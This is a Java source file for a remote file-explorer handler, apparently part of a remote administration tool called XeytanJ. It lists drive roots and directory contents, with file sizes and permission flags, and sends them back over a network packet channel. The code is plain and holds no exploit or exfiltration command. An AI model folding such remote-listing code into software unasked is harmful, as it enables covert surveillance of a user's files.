package com.melardev.xeytanj.explorer;

import com.melardev.xeytanj.logger.ConsoleLogger;
import com.melardev.xeytanj.logger.ILogger;
import com.melardev.xeytanj.IApplication;
import com.melardev.xeytanj.models.FileInfoStructure;
import com.melardev.xeytanj.net.packets.filesystem.PacketFileExplorer;
import com.melardev.xeytanj.remote.PacketHandler;

import java.io.File;

import javax.swing.Icon;
import javax.swing.ImageIcon;
import javax.swing.filechooser.FileSystemView;


public class FileManager implements PacketHandler<PacketFileExplorer> {

    private final IApplication application;

    private FileSystemView fsv;
    private ILogger logger;

    public FileManager(IApplication application, ConsoleLogger logger) {
        this.application = application;
        fsv = FileSystemView.getFileSystemView();
        this.logger = logger;
    }


    public void handlePacket(PacketFileExplorer packet) {
        logger.trace("Handling " + packet.getAction());
        switch (packet.getAction()) {
            case LIST_FILES:
                sendDirectoryView(packet.path);
                break;
            case LIST_ROOTS:
                sendRoots();
                break;
            default:
                break;
        }
    }

    @Override
    public void setLogger(ILogger logger) {
        this.logger = logger;
    }

    private FileInfoStructure[] getRoots() {
        logger.traceCurrentMethodName();
        File[] roots = File.listRoots();
        int count = 0;
        FileInfoStructure[] rootWrappers = new FileInfoStructure[roots.length];
        for (File f : roots) {
            rootWrappers[count++] = new FileInfoStructure(f.getAbsolutePath(), (ImageIcon) fsv.getSystemIcon(f));
        }
        return rootWrappers;
    }

    private void sendRoots() {
        logger.traceCurrentMethodName();
        FileInfoStructure[] roots = getRoots();
        PacketFileExplorer packetRoots = new PacketFileExplorer(roots, true);
        application.sendPacket(packetRoots);
    }

    private void sendDirectoryView(String path) {
        logger.traceCurrentMethodName();

        FileInfoStructure[] files = getDirectory(path);

        if (files == null) //some error then roots sent
            return;
        PacketFileExplorer packet = new PacketFileExplorer(files, false);
        application.sendPacket(packet);


    }

    protected FileInfoStructure[] getDirectory(String dirPath) {
        logger.trace(dirPath);
        dirPath = dirPath.replace("\\", "/");
        if (!dirPath.endsWith("/"))
            dirPath += "/";
        File[] listFiles = new File(dirPath).listFiles();
        if (listFiles == null) {
            sendRoots();
            return null;
        }
        int count = 0;

        FileInfoStructure[] files = new FileInfoStructure[listFiles.length];
        for (File f : listFiles) {
            Icon icon = fsv.getSystemIcon(f);
            if (f.isFile()) {
                files[count] = new FileInfoStructure(f.getAbsolutePath(), f.getName(), (ImageIcon) icon, f.length(),
                        f.canExecute(), f.canRead(), f.canWrite());

            } else {
                //is Directory
                files[count] = new FileInfoStructure(f.getAbsolutePath(), f.getName(), (ImageIcon) icon);
            }
            count++;
        }

        return files;

    }


    //@Override
    public void stopService() {

    }

}
